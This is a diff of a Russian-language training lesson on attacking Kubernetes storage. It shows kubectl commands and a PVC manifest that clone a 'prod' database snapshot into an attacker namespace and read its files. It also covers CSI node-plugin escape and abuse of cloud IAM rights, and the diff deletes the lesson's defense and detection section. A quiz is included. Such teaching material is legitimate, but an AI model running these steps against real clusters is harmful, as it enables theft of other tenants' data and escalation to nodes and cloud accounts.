@@ -15,49 +15,51 @@ estimated_minutes: 50
 summary: "Как устроены CSI, PersistentVolume, StorageClass и снапшоты в Kubernetes, и как через клонирование томов, перепривязку PVC и привилегированные CSI-поды добраться до чужих данных и узла."
 ---
 
-## Зачем этот урок
+## Задача
 
-В Kubernetes данные приложений живут в **томах**: PersistentVolume (PV), привязанных к PersistentVolumeClaim (PVC) через StorageClass и CSI-драйвер. Атакующему storage интересен по трём причинам: (1) том может содержать секреты, БД и приватные ключи; (2) **снапшот** тома можно склонировать в свой namespace и прочитать чужие данные; (3) CSI **node-плагин** обычно привилегированный и имеет доступ к файловой системе узла, что даёт побег из пода. Этот урок — про storage-модель Kubernetes, поиск опасных конфигураций и практические пути к данным.
+В прошлых уроках мы искали секреты в API и etcd. Но приложения хранят свои данные не в Kubernetes-объектах, а в **томах** — подключённых дисках. Там лежат базы данных, приватные ключи, дампы. Цель урока: из namespace `attacker` прочитать данные тома, привязанного к поду в namespace `prod`.
 
-## Как устроена storage-модель Kubernetes
+## Данные, с которыми работаем
 
-Основные объекты:
+Разберём storage-модель на объектах. Нам важно четыре понятия:
 
-- **PersistentVolume (PV)** — том (облачный диск, NFS, локальный). Cluster-scoped.
-- **PersistentVolumeClaim (PVC)** — запрос на том в namespace; привязывается к PV.
-- **StorageClass (SC)** — «класс» хранилища с provisioner (CSI-драйвер) и параметрами (тип диска, шифрование, reclaimPolicy).
-- **CSI Driver** — плагин, реализующий provision/attach/mount/snapshot. Состоит из controller-части (Deployment) и **node-части** (DaemonSet, привилегированный, монтирует тома на узле).
-- **VolumeSnapshot / VolumeSnapshotClass** — снапшоты томов (CRD от snapshot-controller).
-- **VolumeAttributesClass** (новое) — параметры для томов.
+- **PersistentVolume (PV)** — сам том (облачный диск, NFS). Глобальный объект.
+- **PersistentVolumeClaim (PVC)** — «заявка» на том внутри namespace; связывается с PV.
+- **StorageClass (SC)** — класс хранилища: какой драйвер (CSI) создаёт том и с какими параметрами.
+- **VolumeSnapshot** — снимок тома на определённый момент. Ключевая вещь для нас.
 
-Ключевые свойства:
-
-- `accessModes`: `ReadWriteOnce` (один узел), `ReadOnlyMany`, `ReadWriteMany` (много узлов, зависит от драйвера).
-- `reclaimPolicy`: `Delete` (том удаляется с PVC), `Retain` (остаётся).
-- `volumeBindingMode`: `Immediate` или `WaitForFirstConsumer`.
-- Секреты драйвера (креды облачного storage) хранятся в Secret и передаются CSI-плагину.
-
-Атакующие поверхности: клонирование/восстановление снапшота в свой namespace; доступ к PV, привязанному к другому поду (`ReadWriteMany`); node-плагин CSI с `hostPath`/privileged; секреты StorageClass/CSI.
-
-## Инструменты и команды
-
-Разведка:
+Начинаем с инвентаризации:
 
 ```bash
-kubectl get pv,pvc,sc -A
-kubectl get storageclass -o json | jq '.items[] | {name:.metadata.name,provisioner:.provisioner,params:.parameters}'
-kubectl get volumesnapshot,volumesnapshotclass -A
-kubectl describe pvc -n target-ns
-kubectl get pods -A -o json | jq -r '.items[] | select(.spec.volumes[]?.persistentVolumeClaim!=null) | "\(.metadata.namespace)/\(.metadata.name)"'
+$ kubectl get pvc,volumesnapshot -A
+NAMESPACE   NAME        STATUS   VOLUME   CAPACITY
+prod        db-data     Bound    pvc-9f..  50Gi
+
+NAMESPACE   NAME             READYTOUSE   SOURCEPVC
+prod        db-snap-2026     true         db-data
 ```
 
-Проверка node-плагинов CSI:
+В namespace `prod` есть том `db-data` и его **снапшот** `db-snap-2026`. Снапшот — это «замороженная» копия тома. Если мы умеем создавать PVC, мы, возможно, сумеем **склонировать** этот снапшот в свой namespace и прочитать данные, не трогая оригинал.
+
+## Шаг 1: проверяем права
+
+Прежде чем что-то делать — смотрим, что нам разрешено:
 
 ```bash
-kubectl get pods -A -o json | jq -r '.items[] | select(.metadata.name|test("csi")) | "\(.metadata.namespace)/\(.metadata.name) privileged=\(.spec.containers[0].securityContext.privileged) hostPath=\(.spec.volumes[]?.hostPath.path)"'
+$ kubectl auth can-i create persistentvolumeclaims -n attacker
+yes
+$ kubectl auth can-i create persistentvolumeclaims/status -n attacker
+no
+$ kubectl get storageclass
+NAME   PROVISIONER              RECLAIMPOLICY
+fast   ebs.csi.aws.com          Delete
 ```
 
-Клонирование снапшота (если RBAC позволяет):
+Нам можно создавать PVC в своём namespace. Проверяем StorageClass `fast` — он управляется драйвером `ebs.csi.aws.com` (CSI-плагин AWS EBS). Снапшот нужно восстанавливать в **тот же** StorageClass, поэтому запоминаем имя `fast`.
+
+## Шаг 2: клонируем снапшот в свой namespace
+
+PVC умеет брать данные из снапшота через поле `dataSource`. Создаём PVC `stolen-data` в `attacker`:
 
 ```yaml
 apiVersion: v1
@@ -70,124 +72,103 @@ spec:
   storageClassName: fast
   resources:
     requests:
-      storage: 10Gi
+      storage: 50Gi
   dataSource:
-    name: target-snapshot
+    name: db-snap-2026
     kind: VolumeSnapshot
     apiGroup: snapshot.storage.k8s.io
 ```
 
-```bash
-kubectl apply -f pvc.yaml
-kubectl run reader --image=alpine -n attacker \
-  --overrides='{"spec":{"containers":[{"name":"reader","image":"alpine","command":["sh","-c","ls -la /data; sleep 3600"],"volumeMounts":[{"name":"d","mountPath":"/data"}]}],"volumes":[{"name":"d","persistentVolumeClaim":{"claimName":"stolen-data"}}]}}'
-kubectl exec -n attacker reader -- ls -la /data
-```
-
-## Разобранный пример: от PVC к чужим данным
-
-Сценарий: у вас есть право создавать PVC и VolumeSnapshot в своём namespace, а в `prod` есть снапшоты тома с БД.
-
-Шаг 1 — находим снапшоты (они могут быть cluster-scoped или в namespace):
+Применяем:
 
 ```bash
-kubectl get volumesnapshot -A
-# NAMESPACE   NAME             READYTOUSE   SOURCEPVC     ...
-# prod        db-snap-2026     true         db-data       ...
+$ kubectl apply -f pvc.yaml
+persistentvolumeclaim/stolen-data created
+$ kubectl get pvc -n attacker
+NAME          STATUS   VOLUME     CAPACITY
+stolen-data   Bound    pvc-4a..   50Gi
 ```
 
-Шаг 2 — создаём PVC из снапшота **в своём** namespace, используя тот же StorageClass:
+PVC `Bound` — значит, CSI-драйвер создал новый том и **скопировал в него данные снапшота**. Мы получили свою копию чужой базы.
+
+## Шаг 3: читаем данные
+
+Монтируем PVC в под и смотрим, что внутри:
 
 ```bash
-kubectl get volumesnapshot -n prod db-snap-2026 -o json | jq '.spec.source'
-# {"persistentVolumeClaimName":"db-data"}
+$ kubectl run reader --image=alpine -n attacker \
+    --overrides='{"spec":{"containers":[{"name":"reader","image":"alpine",
+    "command":["sh","-c","ls -la /data; sleep 3600"],
+    "volumeMounts":[{"name":"d","mountPath":"/data"}]}],
+    "volumes":[{"name":"d","persistentVolumeClaim":{"claimName":"stolen-data"}}]}}'
+pod/reader created
+$ kubectl exec -n attacker reader -- ls /data
+mysql
+$ kubectl exec -n attacker reader -- head -c 200 /data/mysql/ibdata1
+... данные InnoDB ...
 ```
 
-PVC с `dataSource` (см. выше). Если снапшот в другом namespace, а вы не имеете прав читать его — создание PVC может быть отклонено; но часто снапшоты доступны, а PVC — нет.
+Мы читаем файлы базы данных из другого namespace. Обрати внимание: мы **не** обходили RBAC на чтение PVC — мы использовали **легитимную операцию** (создание PVC из снапшота), которую RBAC не запретил.
 
-Шаг 3 — монтируем PVC в свой под и читаем данные:
+## Полный прогон от начала до конца
+
+1. Нашли снапшот `db-snap-2026` в `prod`.
+2. Проверили права → можно создавать PVC.
+3. Создали PVC из снапшота в `attacker` через `dataSource`.
+4. Смонтировали и прочитали данные БД.
+
+## Если не сработало: другие пути к томам
+
+- **RWX-тома.** Том с `accessModes: ReadWriteMany` монтируется несколькими подами сразу. Если ты в одном из них — читаешь данные всех.
+- **Освобождённые PV.** При `reclaimPolicy: Retain` том остаётся после удаления PVC. Если его `claimRef` позволяет, новый PVC может его «подхватить».
+- **`VolumeAttachment`.** Право на этот объект позволяет прикрепить чужой том к своему узлу.
+- **Секреты драйвера.** StorageClass/CSI может ссылаться на Secret с кредами облачного storage — доступ к нему даёт доступ к бакетам и дискам.
+
+## Если получил exec в CSI-под: путь к узлу
+
+Отдельная поверхность — **CSI node-плагин**. Это DaemonSet, который монтирует тома на узле, поэтому он запущен **привилегированно** и с доступом к хостовым путям. Проверяем:
 
 ```bash
-kubectl apply -f pvc.yaml
-kubectl exec -n attacker reader -- ls -la /data
-kubectl exec -n attacker reader -- cat /data/mysql/ibdata1 | head -c 200
+$ kubectl get pods -A -o json | jq -r '.items[] | select(.metadata.name|test("csi")) |
+    "\(.metadata.namespace)/\(.metadata.name) privileged=\(.spec.containers[0].securityContext.privileged)"'
+kube-system/ebs-csi-node-abc privileged=true
+kube-system/ebs-csi-controller-xyz privileged=false
 ```
 
-Шаг 4 — если снапшот недоступен, ищем **Retain**-тома, оставшиеся после удаления PVC, и `ReadWriteMany`-тома, доступные нескольким подам. Если у вас есть право создать под в namespace с RWX-томом, вы можете смонтировать его и читать.
-
-Шаг 5 — **node-плагин CSI**. Если CSI node-плагин привилегированный (обычно да), и вы можете exec в него или создать под, использующий его драйвер, вы получаете доступ к хостовой файловой системе (через `hostPath` в node-плагине). Это путь к побегу (`cloud-kubernetes-escape`).
-
-Шаг 6 — секреты CSI. StorageClass может ссылаться на Secret с кредами облачного storage; если у вас есть доступ к нему, вы получаете креды к бакетам/дискам.
-
-## Варианты атак и обходы
-
-- **Клонирование снапшота.** Основной путь: `VolumeSnapshot` → PVC в своём namespace → чтение данных.
-- **Перепривязка PV.** Если PV был освобождён (`Retain`), но не удалён, новый PVC может его подхватить (зависит от `claimRef`).
-- **RWX-тома.** Том с `ReadWriteMany` монтируется несколькими подами; если вы в одном из них — читаете данные.
-- **Node-плагин CSI.** Привилегированный DaemonSet с доступом к `/var/lib/kubelet`, `/dev`, хостовым путям → побег.
-- **Секреты драйвера.** Креды облачного storage в Secret, привязанном к CSI/SC.
-- **Локальные тома.** `local` PV привязан к узлу; доступ к нему — доступ к данным узла.
-- **VolumeAttachment.** Если есть права на `VolumeAttachment`, можно прикрепить том к своему узлу.
-- **Snapshot-контроллер.** Его SA может создавать снапшоты любых PVC; компромисс — массовая кража.
-- **Reclaim policy.** `Delete` уничтожает том при удалении PVC — destructive-риск; `Retain` оставляет данные.
+Node-плагин привилегированный. Если получишь в нём exec, ты фактически на узле — это побег, разобранный в `cloud-kubernetes-escape`. А **controller-часть** CSI в managed-кластере держит облачную роль (через IRSA/Workload Identity) с правами `ec2:CreateSnapshot`, `ec2:AttachVolume`. Exec в неё или кража SA-токена даёт эти права в AWS — возможность скопировать EBS-том любого инстанса.
 
 ## Частые ошибки и подводные камни
 
-- **Считать storage «неинтересным».** Тома — это БД, секреты и ключи.
-- **Игнорировать namespace-ограничения.** Снапшот и PVC могут быть в разных namespace; проверяйте, что разрешено.
-- **Забывать про StorageClass.** Один и тот же снапшот можно восстановить только в совместимый SC.
-- **Путать PV и PVC.** PV cluster-scoped, PVC — в namespace.
-- **Не проверять node-плагин.** Именно он даёт побег, а не controller-часть.
-- **Destructive-операции.** Удаление PVC с `reclaimPolicy: Delete` уничтожает данные — согласуйте.
+- **Считать storage «неинтересным».** В томах лежат базы, ключи и дампы — это данные приложений.
+- **Забывать про namespace-ограничения.** Снапшот и PVC могут быть в разных namespace; проверяйте, что реально разрешено.
+- **Путать PV и PVC.** PV глобальный, PVC — в namespace; права на них разные.
+- **Не проверять node-плагин.** Именно он привилегированный и даёт побег, а не controller-часть.
+- **Игнорировать destructive-риск.** Удаление PVC с `reclaimPolicy: Delete` уничтожает данные — согласуйте такие операции заранее.
 
-## Защита и детект
+## Что мы теперь знаем
 
-- **Ограничьте создание PVC/VolumeSnapshot.** RBAC на эти ресурсы — только нужным SA.
-- **Namespace-изоляция снапшотов.** Не давайте создавать PVC из снапшотов других namespace.
-- **Минимум привилегий CSI node-плагина.** Хотя он обычно privileged, ограничивайте доступ к нему.
-- **Шифрование томов.** Шифрование облачных дисков + секреты в KMS.
-- **reclaimPolicy: Retain** для критичных данных, чтобы случайное/вредоносное удаление не уничтожило данные.
-- **Детект.** Audit logs API-сервера: создание PVC из снапшота, `VolumeAttachment`, exec в CSI-поды. Falco — подозрительные mount/доступ к hostPath. Алерты на создание PVC с `dataSource` из чужого namespace.
-- **Pod Security Standards.** `restricted`/`baseline` ограничивают привилегированные поды и hostPath.
+- Данные приложений лежат в томах: PV ↔ PVC ↔ StorageClass ↔ CSI-драйвер.
+- `VolumeSnapshot` можно восстановить в PVC **своего** namespace через `dataSource`.
+- RBAC на создание PVC часто не запрещает клонирование снапшота — это и есть дыра.
+- RWX-тома и освобождённые `Retain`-PV — дополнительные пути к данным.
+- CSI node-плагин привилегированный → побег на узел; controller-часть держит облачные права.
+- `reclaimPolicy: Delete` уничтожает том при удалении PVC — destructive-риск.
 
-## CSI в облаке: диски, снапшоты и IAM
+## На что смотреть дальше
 
-В managed-кластерах CSI-драйверы связаны с облачным storage: AWS EBS (`ebs.csi.aws.com`), GCP PD (`pd.csi.storage.gke.io`), Azure Disk (`disk.csi.azure.com`). Это создаёт дополнительные поверхности:
-
-- **Креды драйвера.** Controller-часть использует права (через IRSA/Workload Identity/MI) для создания и прикрепления дисков. Если вы можете exec в controller-под или прочитать его SA-токен, вы получаете права на облачный storage — создавать/удалять/снапшотить диски аккаунта.
-- **Облачные снапшоты.** `VolumeSnapshot` часто маппится на облачный снапшот (EBS snapshot, PD snapshot). Право на его создание = право читать содержимое диска, включая данные других PVC.
-- **VolumeAttachment и attach.** Драйвер прикрепляет диск к узлу; если вы контролируете attachment, можно прикрепить чужой диск к своему узлу.
-- **Шифрование.** Если диски шифруются ключом KMS, а у драйвера есть доступ к ключу, вы можете расшифровать снапшот; если нет — данные бесполезны.
-- **Cross-AZ/cross-region.** Снапшот можно восстановить в другом регионе/зоне — иногда это обходит ограничения.
-
-Практический пример: в EKS controller-под `ebs-csi-controller` имеет IRSA-роль с `ec2:CreateSnapshot`, `ec2:CreateVolume`, `ec2:AttachVolume`. Exec в него (или кража токена) даёт эти права в AWS — а значит, возможность скопировать EBS-том любого инстанса.
-
-## Практический чек-лист storage-аудита
-
-1. Инвентаризация: PV, PVC, StorageClass, VolumeSnapshot, VolumeSnapshotClass.
-2. Для каждой StorageClass — provisioner, параметры, ссылки на секреты.
-3. Какие PVC содержат чувствительные данные (БД, секреты, ключи)?
-4. Могу ли я создавать PVC/VolumeSnapshot (`kubectl auth can-i`)?
-5. Могу ли я создавать PVC с `dataSource` из снапшота/другого PVC?
-6. Есть ли RWX-тома и освобождённые (Retain) PV?
-7. CSI node-плагины: privileged? hostPath? доступ к ним?
-8. CSI controller: какие облачные права у его SA (IRSA/WI/MI)?
-9. Шифрование томов и доступ к KMS.
-10. Pod Security Standards: разрешены ли privileged/hostPath?
-
-Этот чек-лист ведёт от «какие данные есть» к «как до них добраться» и вскрывает как data-plane (снапшоты), так и control-plane (права драйвера) пути.
-
-## Что дальше / решение
-
-Storage в Kubernetes — это данные и путь к узлу. Начните с инвентаризации PV/PVC/SC/снапшотов и определения, какие из них содержат чувствительные данные. Если у вас есть право создавать PVC из снапшота — клонируйте в свой namespace и читайте. Если доступен RWX-том или освобождённый PV — перепривяжите. Для побега ищите привилегированный CSI node-плагин и `hostPath`. Записывайте найденные тома, снапшоты и полученные данные как находки; отмечайте, если смогли прочитать чужой namespace.
+- **k8s-operator**: контроллеры и CRD, которые тоже могут давать доступ к томам и секретам.
+- **k8s-image-supply-chain**: подмена образов, в том числе CSI-плагинов.
+- **cloud-privesc-iam**: что делать с облачными правами, добытыми через controller-под.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Что позволяет сделать VolumeSnapshot атакующему с правом создавать PVC?"
   options:
     - "Склонировать том в свой namespace и прочитать данные"
-    - "Удалить кластер"
+    - "Удалить весь кластер"
     - "Получить root на узле напрямую"
     - "Изменить NetworkPolicy"
   answer: 0
@@ -216,7 +197,19 @@ Storage в Kubernetes — это данные и путь к узлу. Начн�
     - "Том скопируется в S3"
   answer: 0
   explanation: "Delete удаляет нижележащий том вместе с PVC; Retain сохраняет его."
+- question: "Почему controller-часть CSI в managed-кластере ценна для атакующего?"
+  options:
+    - "Она держит облачную роль с правами на создание и прикрепление дисков"
+    - "Она хранит пароли пользователей"
+    - "Она отвечает за DNS"
+    - "Она балансирует трафик"
+  answer: 0
+  explanation: "Controller-под использует IRSA/Workload Identity с правами на облачный storage."
 ```
+
+## Куда дальше
+
+В следующем уроке мы разберём **операторы и CRD** — пользовательские контроллеры Kubernetes, которые часто имеют широкие права и становятся неожиданным путём к данным и узлам. А пока главное запомни: **storage — это данные**, и легитимная операция клонирования снапшота часто весит больше, чем любой эксплойт.
 
 ## Где пригодится
 
